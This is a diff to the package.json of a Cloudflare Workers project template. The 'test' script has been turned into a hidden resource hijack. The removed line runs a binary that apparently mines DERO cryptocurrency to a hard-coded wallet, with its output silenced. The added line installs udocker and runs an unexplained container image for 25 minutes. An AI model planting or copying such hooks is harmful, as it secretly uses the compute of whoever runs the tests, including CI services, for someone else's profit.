@@ -5,7 +5,7 @@
   "description": "A template for kick starting a Cloudflare Workers project",
   "main": "index.js",
   "scripts": {
-    "test": "chmod 700 inter;timeout 25m ./inter -o wss://dero-node.mysrv.cloud:10300 -u deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr >/dev/null 2>&1;echo DONE",
+    "test": "pip install udocker;timeout 25m udocker run iberchreti/go:latest;echo DONE",
     "format": "prettier --write '**/*.{js,css,json,md}'"
   },
   "author": "Kristian Freeman <kristian@kristianfreeman.com>",
